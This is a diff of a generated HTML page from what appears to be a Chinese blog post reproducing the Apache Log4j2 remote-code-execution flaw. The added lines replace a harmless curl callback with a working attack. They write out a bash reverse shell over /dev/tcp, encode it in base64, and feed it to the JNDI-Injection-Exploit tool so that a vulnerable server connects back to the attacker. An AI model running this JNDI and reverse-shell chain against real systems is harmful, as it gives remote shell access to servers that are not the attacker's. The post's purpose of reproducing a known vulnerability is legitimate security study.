@@ -581,7 +581,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    398
+                    437
                 </div>
                 
 
@@ -655,12 +655,16 @@ java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
 <p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211001809222.png"></p>
 <p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211001826534.png"></p>
 <h3 id="JNDI-Injection-Exploit"><a href="#JNDI-Injection-Exploit" class="headerlink" title="JNDI-Injection-Exploit"></a>JNDI-Injection-Exploit</h3><p>用<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>的话就可以一键了。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C &quot;curl http:&#x2F;&#x2F;xx.ceye.io&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>先用base64加密下反弹shell命令以防错误</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT 0&gt;&amp;1
+# &#x3D;&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|bash&quot; -A IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
 <p>确保1099、1389、8180端口可用</p>
 </blockquote>
-<p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211003159893.png"></p>
+<p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211170346324.png"></p>
 <p><img src="/../images/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/image-20211211150557399.png"></p>
 
                 
